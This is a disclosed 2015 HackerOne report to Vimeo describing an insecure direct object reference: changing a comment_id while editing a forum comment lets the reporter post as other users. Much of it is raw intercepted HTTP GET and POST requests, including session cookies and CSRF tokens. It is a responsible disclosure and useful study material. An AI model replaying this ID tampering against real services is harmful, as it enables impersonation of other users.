@@ -1,0 +1,53 @@
+ReportLink:https://hackerone.com/reports/52176
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/patrik
+ReportedTo:Vimeo(vimeo)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:04.05.2015 16:51:07
+
+Summary:
+
+Insecure Direct Object References
+
+Dear Vimeo Team, i recently discovered a bug which allowed me to send comments in the forum in behalf on any user
+
+The trick here is to create a comment with your account Post it, and press on Edit :
+
+GET /forums/wanted_and_offered/topic:130606?comment_id=13010973&is_sticky=0&action=comment_edit_form HTTP/1.1
+Host: vimeo.com
+Connection: keep-alive
+Accept: text/html, application/xml, text/xml, */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
+Referer: https://vimeo.com/forums/wanted_and_offered/topic:130606
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4,it;q=0.2
+Cookie: _abexps=%7B%2248%22%3A%22%22%7D; auto_load_stats=1; clips=119241865; notification_53=1426502158; vimeo=epkmdcsskk70pcdx9tsxc297jpcdx9tsxc297l5i_e%2C5apc7%2Cp5c9kdw5mkvsfsxrdxwwwum05m500vrrt2usmxduw; vimeo_player=eypkmdcsskk70pcdx9tsxxxc7jpcdx9tsxxxc7%2Cpkmk0kr9sd25tdkfwcsx2mcrw50wrv0c9r9t90ccm; last_page=%2Fhome; has_logged_in=1; stats_start_date=2015%2F03%2F12; stats_end_date=2015%2F03%2F16; search_ref=121392801; xsrft=6e2b01771ab39f0663cd6863d69217e1.2747550b08185735962e460fafcbae86; vod_s=%7B%22start_location%22%3A%22container%22%2C%22referrer%22%3A%22https%3A%5C%2F%5C%2Fvimeo.com%5C%2Fsearch%3Fq%3D%2522%2522%2522%2522%2522%2522%2522%253E%253Cimg%2520src%253Dx%22%2C%22id%22%3A31912%7D; player="captions=af.captions"; vuid=944960715.120820070; __utma=18302654.581098069.1426499521.1426499521.1426502225.2; __utmb=18302654.17.9.1426502473945; __utmc=18302654; __utmz=18302654.1426502225.2.2.utmcsr=email|utmccn=1091|utmcmd=vimeo-intro-welcome-20130100; __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=0=1^10=vuid=944960715.120820070=1; __utmli=comment
+
+
+
+You will get something like this, if you now change the ID=13010973 Part to 13010972, you will be redirected to the Post of the originated User, 
+
+Pimped &amp; posted ;-) http://thekitesurfchannel.com/videos/i-am-gold-episode-2/ 
+
+This one if you then Click on Post and intercept this particular message again, you will get the following Message, and the Message get's posted
+
+POST /121947416 HTTP/1.1
+Host: vimeo.com
+Connection: keep-alive
+Content-Length: 619
+Accept: text/html, application/xml, text/xml, */*
+Origin: https://vimeo.com
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
+Content-type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://vimeo.com/forums/wanted_and_offered/topic:130606
+Accept-Encoding: gzip, deflate
+Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4,it;q=0.2
+Cookie: _abexps=%7B%2248%22%3A%22%22%7D; auto_load_stats=1; clips=119241865; notification_53=1426502158; vimeo=epkmdcsskk70pcdx9tsxc297jpcdx9tsxc297l5i_e%2C5apc7%2Cp5c9kdw5mkvsfsxrdxwwwum05m500vrrt2usmxduw; vimeo_player=eypkmdcsskk70pcdx9tsxxxc7jpcdx9tsxxxc7%2Cpkmk0kr9sd25tdkfwcsx2mcrw50wrv0c9r9t90ccm; has_logged_in=1; stats_start_date=2015%2F03%2F12; stats_end_date=2015%2F03%2F16; search_ref=121392801; xsrft=6e2b01771ab39f0663cd6863d69217e1.2747550b08185735962e460fafcbae86; vod_s=%7B%22start_location%22%3A%22container%22%2C%22referrer%22%3A%22https%3A%5C%2F%5C%2Fvimeo.com%5C%2Fsearch%3Fq%3D%2522%2522%2522%2522%2522%2522%2522%253E%253Cimg%2520src%253Dx%22%2C%22id%22%3A31912%7D; player="captions=af.captions"; vuid=944960715.120820070; __utma=18302654.581098069.1426499521.1426499521.1426502225.2; __utmb=18302654.20.9.1426502473945; __utmc=18302654; __utmz=18302654.1426502225.2.2.utmcsr=email|utmccn=1091|utmcmd=vimeo-intro-welcome-20130100; __utmv=18302654.|2=user_type=basic=1^3=ms=0=1^7=video_count=0=1^10=vuid=944960715.120820070=1; xsrft=3a0822b94e27d8255ada31b02cc43ddc.2747550b08185735962e460fafcbae86
+
+text=Pimped%20%26%20posted%20%3B-)%20http%3A%2F%2Fthekitesurfchannel.com%2Fvideos%2Fi-am-gold-episode-2%2F&action=edit_comment&comment_id=13010973&token=3a0822b94e27d8255ada31b02cc43ddc.2747550b08185735962e460fafcbae86&version=%7B%22name%22%3A%22chrome%22%2C%22version%22%3A41%2C%22Platform%22%3A%7B%22name%22%3A%22mac%22%2C%22mac%22%3Atrue%7D%2C%22Features%22%3A%7B%22xpath%22%3Atrue%2C%22air%22%3Afalse%2C%22query%22%3Atrue%2C%22json%22%3Atrue%2C%22xhr%22%3Atrue%7D%2C%22Plugins%22%3A%7B%22Flash%22%3A%7B%22version%22%3A17%2C%22build%22%3A0%7D%7D%2C%22chrome%22%3Atrue%2C%22chrome41%22%3Atrue%2C%22loaded%22%3Atrue%7D
+
+You will see the Output in the pictures, but i will do a POC as a movie aswell
